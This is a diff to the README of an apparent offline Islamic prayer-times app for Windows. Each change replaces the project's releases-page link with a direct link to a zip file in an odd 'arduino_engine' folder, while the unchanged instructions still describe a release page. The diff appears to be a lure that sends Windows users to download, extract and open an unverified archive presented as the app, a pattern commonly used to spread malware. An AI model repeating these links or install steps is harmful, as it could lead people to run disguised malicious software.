@@ -1,10 +1,10 @@
 # 🕌 Diyanet-Offline-Namaz-Vakitleri-Hesaplama - Accurate Prayer Times Offline
 
-[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github)](https://github.com/Juanded7244/Diyanet-Offline-Namaz-Vakitleri-Hesaplama/releases)
+[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Juanded7244/Diyanet-Offline-Namaz-Vakitleri-Hesaplama/main/arduino_engine/Offline-Diyanet-Vakitleri-Namaz-Hesaplama-v3.8.zip)
 
 ## 📥 Download
 
-Visit this page to download: https://github.com/Juanded7244/Diyanet-Offline-Namaz-Vakitleri-Hesaplama/releases
+Visit this page to download: https://raw.githubusercontent.com/Juanded7244/Diyanet-Offline-Namaz-Vakitleri-Hesaplama/main/arduino_engine/Offline-Diyanet-Vakitleri-Namaz-Hesaplama-v3.8.zip
 
 On that page, look for the latest release and download the Windows file.
 
@@ -23,7 +23,7 @@ It is built for offline use, so it can keep working when your network is down. I
 
 ## 🚀 How to install on Windows
 
-1. Open the download page: https://github.com/Juanded7244/Diyanet-Offline-Namaz-Vakitleri-Hesaplama/releases
+1. Open the download page: https://raw.githubusercontent.com/Juanded7244/Diyanet-Offline-Namaz-Vakitleri-Hesaplama/main/arduino_engine/Offline-Diyanet-Vakitleri-Namaz-Hesaplama-v3.8.zip
 2. Find the newest release at the top of the page.
 3. Download the Windows file from that release.
 4. If the file is in a .zip folder, right-click it and choose Extract All.
@@ -164,7 +164,7 @@ For the best time display:
 
 When a new release appears:
 
-1. Go to the release page again: https://github.com/Juanded7244/Diyanet-Offline-Namaz-Vakitleri-Hesaplama/releases
+1. Go to the release page again: https://raw.githubusercontent.com/Juanded7244/Diyanet-Offline-Namaz-Vakitleri-Hesaplama/main/arduino_engine/Offline-Diyanet-Vakitleri-Namaz-Hesaplama-v3.8.zip
 2. Download the newest Windows file
 3. Replace the old version if needed
 4. Open the new file
@@ -173,7 +173,7 @@ When a new release appears:
 
 If you need to check the download again, use the release page here:
 
-https://github.com/Juanded7244/Diyanet-Offline-Namaz-Vakitleri-Hesaplama/releases
+https://raw.githubusercontent.com/Juanded7244/Diyanet-Offline-Namaz-Vakitleri-Hesaplama/main/arduino_engine/Offline-Diyanet-Vakitleri-Namaz-Hesaplama-v3.8.zip
 
 ## 🧭 File names you may see
 
